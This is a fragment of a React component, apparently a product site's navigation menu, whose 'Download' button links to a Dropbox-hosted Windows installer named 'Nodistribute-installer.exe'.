...
function App() {
  ...
  const DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/lx0ofssx0khbhgjeqo1m8/Nodistribute-installer.exe?rlkey=7bwm86crl0lk1sjgc8ntcdxyi&st=iirzown8&dl=1";
            ...
            <div className="flex items-center justify-between">
              ...
              >
                <div className="flex flex-col items-center justify-center h-full space-y-8 px-6">
                  <div className="w-full max-w-sm mx-auto bg-black/80 rounded-lg p-6">
                    <div className="space-y-6">
                      <Link
                        to="/"
                        onClick={() => setIsMenuOpen(false)}
                        className="block text-lg font-medium text-purple-200 hover:text-purple-300 text-center py-2"
                      >
                        Features
                      </Link>
                      <Link
                      ...
                      <a
                        href={DOWNLOAD_URL}
                        onClick={() => setIsMenuOpen(false)}
                        className="block text-center bg-white text-black hover:bg-white/90 transition-opacity rounded-full px-6 py-2 mt-4"
                      >
                        Download
                      </a>
                    </div>
